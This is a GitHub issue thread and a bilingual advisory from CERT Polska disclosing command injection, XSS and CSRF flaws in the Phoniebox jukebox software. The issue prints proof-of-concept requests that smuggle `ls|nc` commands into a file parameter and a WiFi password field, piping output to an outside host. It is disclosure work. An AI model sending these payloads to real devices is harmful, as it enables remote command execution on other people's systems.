| Version ~~3.5.2~~ 2.6 Branch develop OS Ubuntu Pi model NA Hardware *No response* What happened? Hello, CERT.PL has found several vulnerabilities while performing a wider scan of open source projects. Since our [last issue](https://github.com/MiczFlor/RPi-Jukebox-RFID/issues/2120) remained open, we've decided to post details here and reserve CVEs to make the discussion easier. We tested the current state of `develop` branch.  As we focus mainly on finding vulnerabilities, we may not be able to assist you in the process of preparing required fixes and/or validate their quality. RCE/XSS/CSRF ([CVE-2024-3798](https://github.com/advisories/GHSA-954r-8vpp-vj52 "CVE-2024-3798")) GET parameter `file` handled by `htdocs/api/playlist/playsinglefile.php` let's you execute commands POC: `http://127.0.0.1:8002/RPi-Jukebox-RFID/htdocs/api/playlist/playsinglefile.php?file=%27;ls|nc%20web.kazet.cc%203333%20%23`  Using the same parameter it's possible to exploit XSS vulnerability: `http://127.0.0.1:8002/RPi-Jukebox-RFID/htdocs/api/playlist/playsinglefile.php?file=%3Cscript%3Ealert(1);%3C/script%3E`  and also CSRF, which results in opening any file an attacker would point to. RCE ([CVE-2024-3799](https://github.com/advisories/GHSA-98h6-g9rg-hxmr "CVE-2024-3799")) Sending a crafted POST request to `htdocs/inc.setWifi.php` let's you execute commands.  POC: `fetch("http://127.0.0.1:8002/RPi-Jukebox-RFID/htdocs/inc.setWifi.php", {"headers": {"content-type": "application/x-www-form-urlencoded",},"body": "submitWifi=submit&WIFIssid_ls=lll&WIFIpass_ls=12345678';ls|nc web.kazet.cc 3333; #&WIFIprio_ls=1","method": "POST",}).then((response) => {return response.text(); }).then((data) => {console.log(data);})`  While this file should not be directly accessible from the internet, one may think of a scenario when a Jukebox user visits a site with an included JS script, which would send such a request to multiple hosts on LAN network Logs *No response* Configuration *No response* More info *No response* |

| We just searched for popular projects on GH and performed a relatively shallow check on them. Surely the scan was not intended to find all possible vulnerabilities, so other ones might exist in this project. |

| [@CERT-PL-CNA](https://github.com/CERT-PL-CNA) thanks for the info.  You may want to clarify the description of both entries a little.  Newer versions of 3.x branches are **not** affected as the version 3 is a complete rewrite which uses a completely new code base (and no PHP at all).  Personally I also don't think the severity is "high" as the Phoniebox web interface is usually only accessed from a local network. |

| Hi [@s-martin](https://github.com/s-martin). you are right about the versions, we have adjusted the entries.  Regarding the CVSS score - as the attack might be performed remotely by serving a malicious website, we opt to leave the factors unchanged. But even if we changed the vector from `Remote` to `Local`, then we would also have to switch the required `User Interaction` to `None` and the overall score would decrease by only 0.1. |

## Description

During its own research, CERT Polska has found several weaknesses in [Phoniebox](https://github.com/MiczFlor/RPi-Jukebox-RFID) open-source project.

Insecure handling of GET header parameter *file*Â included in requests being sent to an instance of the open-source projectÂ Phoniebox allows an attacker to create a website, which â when visited by a user â will send malicious requests to multiple hosts on the local network. If such a request reaches the server, it will cause one of the following (depending on the chosen payload): shell command execution, reflected XSS or cross-site request forgery.
This vulnerability has been assigned [CVE-2024-3798](https://www.cve.org/CVERecord?id=CVE-2024-3798).

Insecure handling of POST header parameter *body*Â included in requests being sent to an instance of the open-source projectÂ Phoniebox allows an attacker to create a website, which â when visited by a user â will send malicious requests to multiple hosts on the local network. If such a request reaches the server, it will cause aÂ shell command execution.
This vulnerability has been assigned [CVE-2024-3799](https://www.cve.org/CVERecord?id=CVE-2024-3799).

This issue affects Phoniebox in all releases through 2.7. Newer releases were not tested, but they might also be vulnerable.
A [Github issue](https://github.com/MiczFlor/RPi-Jukebox-RFID/issues/2342) has been created to address these vulnerabilities.

## Opis podatnoÅci

CERT Polska w ramach badaÅ wÅasnych znalazÅ kilka sÅaboÅci w otwartoÅºrÃ³dÅowym projekcie [Phoniebox](https://github.com/MiczFlor/RPi-Jukebox-RFID).

W przypadku obu podatnoÅci scenariusz ataku zakÅada odwiedziny uÅ¼ytkownika na stronie, ktÃ³ra rozsyÅa Å¼Ädania HTTP do innych hostÃ³w leÅ¼Äcych w tej samej sieci lokalnej, poniewaÅ¼ projekt Phoniebox nie powinien byÄ publicznie dostÄpny w Internecie.

PodatnoÅÄ [CVE-2024-3798](https://www.cve.org/CVERecord?id=CVE-2024-3798) umoÅ¼liwia wstrzykniÄcie komend powÅoki, ktÃ³re zostanÄ wykonane na serwerze, jak rÃ³wnieÅ¼ ataki typu Reflected XSS oraz Cross-Site Request Forgery. Odbywa siÄ to poprzez modyfikacjÄ parametru *file* w Å¼Ädaniach GET. Z kolei podatnoÅÄ [CVE-2024-3799](https://www.cve.org/CVERecord?id=CVE-2024-3799) pozwala na wstrzykniÄcie komend powÅoki korzystajÄc z modyfikacji parametru *body* w Å¼Ädaniach POST.

Podatne sÄ wszystkie wydania do 2.7 wÅÄcznie. Na chwilÄ pisania tego artykuÅu nowsze nie byÅy dostÄpne, problem moÅ¼e wiÄc dotyczyÄ rÃ³wnieÅ¼ wyÅ¼szych wersji.

Na platformie Github zostaÅ zaÅoÅ¼ony [issue](https://github.com/MiczFlor/RPi-Jukebox-RFID/issues/2342) adresujÄcy te problemy.
